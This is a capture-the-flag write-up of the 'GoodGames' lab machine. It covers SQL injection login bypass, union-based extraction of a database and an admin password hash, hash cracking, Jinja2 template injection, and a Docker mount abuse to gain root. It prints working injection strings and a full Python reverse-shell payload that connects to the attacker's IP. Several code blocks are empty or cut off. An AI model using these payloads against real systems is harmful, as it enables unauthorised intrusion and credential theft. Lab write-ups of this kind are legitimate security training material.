In this box, I got to exploit some SQL Injection, Server Side Template Injection, and some Docker misconfiguration. It took me a while to exploit it. And I really enjoyed how I needed to take steps back twice to be able to move further.

## Enumeration

I launched the machine, added its IP to my hosts file, and looked for opened ports.

```bash
$ rustscan -a target -- -A  | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'

Only the port 80 (HTTP) is opened. So I launched dirb to check for hidden files and folders while I looked at the web site.

## Web Site

![Web Site](/assets/images/2022/03/GoodGames/WebSite.png "Web Site")

I looked around the web site for a while. Most of the links didn't work. I went to the blog, and only one post linked to something (http://target.htb/blog/1).

![Blog Post](/assets/images/2022/03/GoodGames/BlogPost.png "Blog Post")

I tried changing the 1 in the URL to perform [SQL Injection](https://portswigger.net/web-security/sql-injection) or [Local File Inclusion](https://www.acunetix.com/blog/articles/local-file-inclusion-lfi/). Being the only post that lead somewhere, I was sure the exploit was in there. But I couldn't exploit it.

Next I tried to login and saw that I could create an account. 

![Signup](/assets/images/2022/03/GoodGames/Signup.png "Signup")

I created an account and used it to login. It showed a welcome message before redirecting me to a profile page.

![Profile](/assets/images/2022/03/GoodGames/Profile.png "Profile")

I couldn't edit anything on my profile. I tried changing my password. But it gave me a 500. I spent some time trying to modify the change password request in Burp, but that was another dead end. I went back to the blog page to see if anything would be different now that I was logged in, but everything was the same as before.

After a while, I went back to the login page and tried SQL Injection. 

![SQLi](/assets/images/2022/03/GoodGames/sqli.png "SQLi")

I tried the simplest injection "' or 1 = 1 -- -" and it worked on the first attempt. 

![Admin Logged In](/assets/images/2022/03/GoodGames/AdminLoggedIn.png "Admin Logged In")


## Internal Administration Site

Once logged in, the site was the same as with a non admin user. Except there was a new link at the top. 

![New Link](/assets/images/2022/03/GoodGames/NewLink.png "New Link")

Clicking on it sent me to 'http://internal-administration.goodgames.htb/'. I added it to my hosts file and reloaded the page. It gave my another login screen. 

![Administration Login Screen](/assets/images/2022/03/GoodGames/AdmininstrationLoginScreen.png "Administration Login Screen")

I made multiple attempt at SQL Injection on that page. I also tried to brute force the loging using admin and admin@goodgames.htb as usernames. But nothing worked. 

It took me some time before I realised that I could go back to the original SQL Injection and use it for more than login as admin. I did a login attempt, then used Burp Repeater to start experimenting with the injection.

First, I tried to find out how may columns were returned by the query. 

```http
POST /login HTTP/1.1
Host: target.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0

email=' Or 1 = 1 Order by 1 -- -- &password=sfdkljds
```

Resulted in:

```html
<h2 class="h4">Welcome admin</h2>
```

I incremented the column to order by until it failed at `Order by 5`. With this, I knew that the query needed to return 4 columns.

Next I needed to find wich column was used as the username that was displayed on the page. 

```http
email=' Union Select 1, 2, 3, 4 -- -- &password=sfdkljds
```
```html
<h2 class="h4">Welcome 4</h2>
```

The fourth column contained the username and was displayed on the page. I could use this to extract any data I wanted from the database.

Get the database name. 

```
email=' Union Select 1, 2, 3, database() -- -- &password=sfdkljds

Welcome main
```

Get the tables in the main database.

```
email=' Union Select 1, 2, 3, GROUP_CONCAT(TABLE_NAME) From information_schema.TABLES Where TABLE_SCHEMA = 'main' -- -- &password=sfdkljds

Welcome blog,blog_comments,user
```

Get the columns in the user table. 
```
email=' Union Select 1, 2, 3, GROUP_CONCAT(COLUMN_NAME) From information_schema.COLUMNS Where TABLE_SCHEMA = 'main' And TABLE_NAME = 'user' -- -- &password=sfdkljds

Welcome id,email,password,name
```

Read the user table.
```
email=' Union Select 1, 2, 3, CONCAT(id, '-', name, '-', email, '-', password) From user Order By 1 Limit 0, 1 -- -- &password=sfdkljds

Welcome 1-admin-admin@goodgames.htb-2b22337f218b2d82dfc3b6f77e7cb8ec
```

I had the MD5 hash of the admin password. I launched hashcat to crack it. 

```bash
$ hashcat -a0 -m0 hash.txt /usr/share/wordlists/rockyou.txt

I used the found password to login the administration portal.

![Administration Dashboard](/assets/images/2022/03/GoodGames/AdminDashboard.png "Administration Dashboard")

I looked around the administration portal until I got to the profile page. 

![Admin Profile](/assets/images/2022/03/GoodGames/AdminProfile.png "Admin Profile")

I tried using [Server Side Template Injection](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) (SSTI) on the full name field. I entered {% raw %}`{{ 7 * 7 }}`{% endraw %} to see if the code would be executed. 

![SSTI](/assets/images/2022/03/GoodGames/SSTI.png "SSTI")

It worked! I followed the [flow from HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#identify) to identify the template engine. Jinja2 was used. 

Next I started a netcat listener on my machine and tried to launch a reverse shell. 


{% raw %}
```
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.23\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\", \"-i\"]);'")}}{%endif%}{% endfor %}
```
{% endraw %}

This got me a hit on my listener. 

```bash
$ nc -lvnp 4444

## Lateral movement

Once I had a shell, I first solidified it. Then I stated looking around the machine. I was root on the machine. But it was quickly clear that I was in a Docker container. 

I wanted to look for other machines that were accessible from the one I was in. I starter a web server in my Kali VM and copied ncat in the webroot. 

```bash
$ cd www/

$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Then I used curl in the container to download nmap.

```bash

```

It found a machine on `172.19.0.1` with 22 (SSH) and 80 (HTTP) opened. I used curl to get the website. It was the first site I found on the box. I tried to SSH to the box using the password I had found, but it failed. 

I started looking around the box for usernames and password. I found some potential passwords in the website code. But none of them worked when I tried to SSH to the other box. 

I looked at the `/etc/passwd` for other usernames, but it did not contains any. I kept enumerating the machine. I tried running LinPEAS in it even if I was already root. Eventually, I listed `/home` and it contained a user's folder, even it the machine did not have the corresponding user.

```

```

I had the first flag, and a username. I tried SSH with that new username and the passwords I had found. The admin password I found with the SQL Injection worked. 

```bash

## Getting root

This one took me way too long. I tried `sudo -l`, but sudo was not present on the box. I looked around for cron jobs and files with suid set. But I did not find anything. I tried listing Docker images, but the user did not have the permission to use Docker. I tried all the password found previously, and another one I found in the website code to su as root. They all failed. I looked in the database on the box, but it only contained the user's password I already had. 

I copied LinPEAS in my web server and tried running it on the box. I went through all the findings 3 times and did not find anything I could exploit.

Eventually, I remembered the `augustus` folder in the Docker container. This should not have been there. It contained the same flag.txt file that was also on the main box. I checked if the folder was mounted in the container by adding a file and verifying if it was in the container.

```
augustus@GoodGames:~$ pwd
/home/augustus

augustus@GoodGames:~$ touch test

augustus@GoodGames:~$ exit
logout

-rw-r----- 1 1000 1000 33 Mar 11 19:34 user.txt
```

The file was there. Since the container ran as root, I could copy a file in the home folder, then go back to the container and changed it's permission. I used that to copy bash in my home folder in the main box. In the container, I could change it's owner to root and set the suid bit. This way, it would be executed as root in the box.
